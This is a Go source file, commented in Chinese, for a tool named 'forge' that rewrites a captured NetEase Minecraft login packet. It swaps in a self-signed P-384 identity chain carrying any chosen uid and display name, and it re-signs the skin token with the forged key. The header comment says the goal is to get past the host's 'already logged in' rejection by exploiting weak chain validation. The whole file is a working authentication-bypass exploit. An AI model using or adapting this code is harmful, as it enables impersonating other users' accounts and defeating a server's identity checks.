// forge 用自生成 P-384 密钥对伪造 NetEase 单元素身份链，绕开房主的"自己已登录"拒绝。
// 房主对单元素链只做自洽性校验（签名 ↔ x5u），我们自己签自己即可通过。
package main

import (
	"bytes"
	"compress/flate"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/sha512"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"strings"
)

func main() {
	if len(os.Args) < 5 {
		fmt.Println("usage: forge <in-hex> <out-hex> <uid> <displayName> [keep-skin=true]")
		return
	}
	inHex, _ := os.ReadFile(os.Args[1])
	outPath := os.Args[2]
	uid := os.Args[3]
	name := os.Args[4]
	keepSkin := true
	if len(os.Args) > 5 {
		keepSkin = os.Args[5] != "false"
	}

	h := strings.Map(func(r rune) rune {
		if r >= '0' && r <= '9' || r >= 'a' && r <= 'f' || r >= 'A' && r <= 'F' {
			return r
		}
		return -1
	}, string(inHex))
	if len(h)%2 != 0 {
		h = h[:len(h)-1]
	}
	comp, _ := hex.DecodeString(h)
	start := 0
	if comp[0] == 0x00 {
		start = 1
	}
	raw, _ := io.ReadAll(flate.NewReader(bytes.NewReader(comp[start:])))

	// 解析原始帧，取出 version / skin
	frameLen, n1 := readVarInt(raw)
	frame := raw[n1 : n1+int(frameLen)]
	header, n2 := readVarInt(frame)
	payload := frame[n2:]
	version := payload[0:4]
	_, n3 := readVarInt(payload[4:])
	rest := payload[4+n3:]
	body := rest[4:]
	var loginJSON map[string]interface{}
	jsonLen := 0
	for end := len(body); end > 0; end-- {
		if json.Unmarshal(body[:end], &loginJSON) == nil {
			jsonLen = end
			break
		}
	}
	if loginJSON == nil {
		fmt.Println("原 JSON 解析失败")
		return
	}
	skin := body[jsonLen:]
	fmt.Printf("原: header=%d version=%d JSON=%d skin=%d\n", header, beUint32(version), jsonLen, len(skin))
	if len(skin) > 0 {
		fmt.Printf("skin 前 160 字节 hex: %x\n", skin[:min(160, len(skin))])
		// 尝试作为 [varint len][JWT] 解析
		if sl, sn := readVarInt(skin); sn > 0 && sn+int(sl) <= len(skin) {
			fmt.Printf("skin 可能是字符串: len=%d 开头: %s\n", sl, string(skin[sn:min(sn+80, len(skin))]))
		}
	}

	// 生成 P-384 密钥对
	priv, err := ecdsa.GenerateKey(elliptic.P384(), rand.Reader)
	if err != nil {
		fmt.Println("生成密钥失败:", err)
		return
	}
	pubDER, _ := x509.MarshalPKIXPublicKey(&priv.PublicKey)
	pubB64 := base64.StdEncoding.EncodeToString(pubDER)

	// 伪造链
	hdrJSON := fmt.Sprintf(`{"alg":"ES384","x5u":"%s"}`, pubB64)

	claims := map[string]interface{}{
		"exp": 2000000000,
		"extraData": map[string]interface{}{
			"XUID":         "",
			"displayName":  name,
			"identity":     "8f2a1c44-1111-4222-8333-444455556666",
			"netease_sid":  "187235:TanLobbyClient",
			"netease_uid":  uid,
			"netease_uuid": "00000000-0000-4000-8000-0000a8bed55a",
		},
		"identityPublicKey": pubB64,
	}
	payloadJSON, _ := json.Marshal(claims)

	jwt := signJWT(priv, string(hdrJSON), payloadJSON)
	fmt.Printf("伪造链: uid=%s name=%s JWT=%d 字节\n", uid, name, len(jwt))

	// 皮肤 JWT：保留原 payload（真实客户端数据），用我们的密钥重新签名
	newSkin := skin
	if keepSkin && len(skin) > 8 {
		skinLen := uint32(skin[0]) | uint32(skin[1])<<8 | uint32(skin[2])<<16 | uint32(skin[3])<<24
		if int(skinLen)+4 <= len(skin) {
			orig := string(skin[4 : 4+skinLen])
			parts := strings.SplitN(orig, ".", 3)
			if len(parts) == 3 {
				origPayload, err := base64.RawURLEncoding.DecodeString(strings.TrimSpace(parts[1]))
				if err == nil {
					skinJWT := signJWT(priv, string(hdrJSON), origPayload)
					nb := make([]byte, 4)
					nb[0] = byte(len(skinJWT))
					nb[1] = byte(len(skinJWT) >> 8)
					nb[2] = byte(len(skinJWT) >> 16)
					nb[3] = byte(len(skinJWT) >> 24)
					nb = append(nb, []byte(skinJWT)...)
					newSkin = nb
					fmt.Printf("皮肤 JWT 已重新签名: %d -> %d 字节\n", skinLen, len(skinJWT))
				}
			}
		}
	}

	// 重建 JSON
	loginJSON["Certificate"] = fmt.Sprintf(`{"chain":["%s"]}`, jwt)
	var buf bytes.Buffer
	enc := json.NewEncoder(&buf)
	enc.SetEscapeHTML(false)
	enc.Encode(loginJSON)
	newJSON := strings.TrimRight(buf.String(), "\n")

	// 组装
	newBody := make([]byte, 4)
	newBody[0] = byte(len(newJSON))
	newBody[1] = byte(len(newJSON) >> 8)
	newBody[2] = byte(len(newJSON) >> 16)
	newBody[3] = byte(len(newJSON) >> 24)
	newBody = append(newBody, []byte(newJSON)...)
	if keepSkin {
		newBody = append(newBody, newSkin...)
	}

	var restBuf bytes.Buffer
	writeVarInt(&restBuf, uint32(len(newBody)))
	framePayload := append([]byte{}, version...)
	framePayload = append(framePayload, restBuf.Bytes()...)
	framePayload = append(framePayload, newBody...)

	var newFrame bytes.Buffer
	writeVarInt(&newFrame, uint32(len(framePayload)+1))
	writeVarInt(&newFrame, header)
	newFrame.Write(framePayload)

	var outBuf bytes.Buffer
	w, _ := flate.NewWriter(&outBuf, flate.DefaultCompression)
	w.Write(newFrame.Bytes())
	w.Close()

	outHex := hex.EncodeToString(outBuf.Bytes())
	os.WriteFile(outPath, []byte(outHex), 0644)
	fmt.Printf("已写出 %s (%d 字节压缩, JSON=%d, skin=%v)\n", outPath, outBuf.Len(), len(newJSON), keepSkin)
}

func readVarInt(b []byte) (uint32, int) {
	var v uint32
	var shift uint
	for i := 0; i < len(b) && i < 5; i++ {
		c := b[i]
		v |= uint32(c&0x7f) << shift
		if c&0x80 == 0 {
			return v, i + 1
		}
		shift += 7
	}
	return 0, 0
}

// signJWT 用 priv 生成 ES384 JWT。
func signJWT(priv *ecdsa.PrivateKey, header string, payload []byte) string {
	input := base64.RawURLEncoding.EncodeToString([]byte(header)) + "." +
		base64.RawURLEncoding.EncodeToString(payload)
	digest := sha512.Sum384([]byte(input))
	r, s, err := ecdsa.Sign(rand.Reader, priv, digest[:])
	if err != nil {
		return ""
	}
	sig := make([]byte, 96)
	r.FillBytes(sig[:48])
	s.FillBytes(sig[48:])
	return input + "." + base64.RawURLEncoding.EncodeToString(sig)
}

func writeVarInt(b *bytes.Buffer, v uint32) {
	for {
		c := byte(v & 0x7f)
		v >>= 7
		if v != 0 {
			b.WriteByte(c | 0x80)
		} else {
			b.WriteByte(c)
			return
		}
	}
}

func beUint32(b []byte) uint32 {
	return uint32(b[0])<<24 | uint32(b[1])<<16 | uint32(b[2])<<8 | uint32(b[3])
}
